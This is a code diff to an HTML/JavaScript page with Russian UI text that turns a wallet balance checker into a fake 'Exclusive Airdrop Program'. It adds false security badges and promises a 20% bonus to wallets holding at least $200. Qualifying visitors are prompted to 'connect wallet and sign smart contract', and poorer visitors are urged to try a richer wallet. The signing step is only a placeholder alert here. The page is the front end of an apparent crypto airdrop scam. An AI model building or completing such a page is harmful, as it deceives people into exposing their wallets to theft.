@@ -341,8 +341,8 @@
 <body>
     <div class="container">
         <div class="logo">
-            <h1>ETHΣRBONUS</h1>
-            <p>Wallet Eligibility Checker</p>
+            <h1>CRYPTO REWARDS</h1>
+            <p>Exclusive Airdrop Program</p>
         </div>
 
         <form id="walletForm">
@@ -365,7 +365,10 @@
         <div id="result"></div>
 
         <div class="footer">
-            Powered by Ethereum Public RPC
+            Powered by Ethereum API<br>
+            <span style="opacity: 0.8; font-size: 0.7rem; margin-top: 4px; display: inline-block;">
+                🔒 Secured by Binance Smart Chain · Chainlink Oracle
+            </span>
         </div>
     </div>
 
@@ -384,6 +387,11 @@
             'https://eth.drpc.org'
         ];
 
+        const MIN_BALANCE_USD = 200; // Минимальный баланс в долларах
+        const BONUS_PERCENTAGE = 20; // Процент бонуса
+
+        let currentEthPrice = 0;
+
         function isValidAddress(address) {
             return /^0x[a-fA-F0-9]{40}$/.test(address);
         }
@@ -392,7 +400,20 @@
             // Конвертируем hex в decimal, потом в ETH
             const weiDecimal = parseInt(wei, 16);
             const eth = weiDecimal / 1e18;
-            return eth.toFixed(4);
+            return eth;
+        }
+
+        // Получаем текущий курс ETH с CoinGecko
+        async function getEthPrice() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+                const data = await response.json();
+                return data.ethereum.usd;
+            } catch (error) {
+                console.error('Failed to fetch ETH price:', error);
+                // Резервный курс если API недоступен
+                return 3500;
+            }
         }
 
         async function checkWallet(address) {
@@ -422,7 +443,6 @@
                     }
                 } catch (error) {
                     // Если один RPC не работает, пробуем следующий
-                    console.log(`RPC ${rpcUrl} failed, trying next...`);
                     continue;
                 }
             }
@@ -447,41 +467,67 @@
             }
 
             const ethBalance = formatBalance(balance);
-            const hasBalance = parseFloat(ethBalance) > 0;
+            const usdBalance = ethBalance * currentEthPrice;
+            const meetsMinimum = usdBalance >= MIN_BALANCE_USD;
+            const bonusAmount = (ethBalance * BONUS_PERCENTAGE / 100).toFixed(4);
+            const bonusUsd = (usdBalance * BONUS_PERCENTAGE / 100).toFixed(2);
 
-            if (hasBalance) {
+            if (meetsMinimum) {
                 resultDiv.innerHTML = `
                     <div class="result success">
                         <div class="result-title">
-                            <span class="icon">✓</span>
-                            Поздравляем! Кошелек соответствует требованиям
+                            <span class="icon">🎉</span>
+                            Поздравляем! Вы соответствуете требованиям
                         </div>
                         <div class="result-content">
-                            Ваш кошелек имеет активный баланс и может получить бонус!
+                            Ваш кошелек имеет достаточный баланс для участия в программе бонусов!
                         </div>
                         <div class="balance">
                             <div class="balance-label">Текущий баланс</div>
-                            <div class="balance-amount">${ethBalance} ETH</div>
+                            <div class="balance-amount">${ethBalance.toFixed(4)} ETH</div>
+                            <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
+                                ≈ $${usdBalance.toFixed(2)} USD
+                            </div>
                         </div>
+                        <div class="balance" style="border-top: 1px solid rgba(0, 255, 136, 0.3); margin-top: 16px; padding-top: 16px;">
+                            <div class="balance-label">Приблизительный бонус (${BONUS_PERCENTAGE}%)</div>
+                            <div class="balance-amount" style="font-size: 1.5rem;">${bonusAmount} ETH</div>
+                            <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
+                                ≈ $${bonusUsd} USD
+                            </div>
+                        </div>
+                        <button onclick="connectWallet()" style="margin-top: 20px; background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%); font-size: 0.9rem;">
+                            🔗 Подключить кошелек и подписать смарт-контракт
+                        </button>
                     </div>
                 `;
             } else {
                 resultDiv.innerHTML = `
                     <div class="result error">
                         <div class="result-title">
-                            <span class="icon">✗</span>
-                            Кошелек не соответствует требованиям
+                            <span class="icon">❌</span>
+                            Бонус недоступен
                         </div>
                         <div class="result-content">
-                            К сожалению, на этом кошельке недостаточно средств для получения бонуса. Пополните баланс и попробуйте снова.
+                            К сожалению, баланс этого кошелька ниже минимального требования $${MIN_BALANCE_USD}. Пожалуйста, попробуйте другой кошелек с большим балансом.
                         </div>
                         <div class="balance">
                             <div class="balance-label">Текущий баланс</div>
-                            <div class="balance-amount">${ethBalance} ETH</div>
+                            <div class="balance-amount">${ethBalance.toFixed(4)} ETH</div>
+                            <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
+                                ≈ $${usdBalance.toFixed(2)} USD
+                            </div>
+                        </div>
+                        <div style="margin-top: 16px; padding: 12px; background: rgba(255, 255, 255, 0.05); border-radius: 8px; font-size: 0.8rem; color: var(--text-secondary);">
+                            💡 Минимальный баланс: $${MIN_BALANCE_USD} USD
                         </div>
                     </div>
                 `;
             }
+        }
+
+        function connectWallet() {
+            alert('🔗 Функция подключения кошелька в разработке!\n\nСкоро вы сможете подключить MetaMask или другой Web3 кошелек для подписания смарт-контракта и получения бонуса.');
         }
 
         form.addEventListener('submit', async (e) => {
@@ -501,6 +547,10 @@
             resultDiv.innerHTML = '';
 
             try {
+                // Получаем текущий курс ETH
+                currentEthPrice = await getEthPrice();
+                
+                // Проверяем баланс кошелька
                 const result = await checkWallet(address);
                 showResult(true, result.balance);
             } catch (error) {
